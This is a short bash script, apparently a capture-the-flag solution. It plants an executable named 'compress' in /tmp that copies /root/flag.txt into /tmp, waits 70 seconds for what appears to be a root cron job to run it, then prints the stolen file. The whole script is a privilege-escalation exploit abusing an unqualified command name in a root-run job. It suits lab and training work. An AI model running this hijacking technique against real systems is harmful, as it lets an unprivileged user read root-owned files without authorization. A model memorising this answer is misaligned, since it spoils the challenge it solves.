#!/bin/bash

printf '%s\n' \
'#!/bin/bash' \
'cat /root/flag.txt > /tmp/flag.txt' \
> /tmp/compress

chmod +x /tmp/compress
sleep 70
cat /tmp/flag.txt
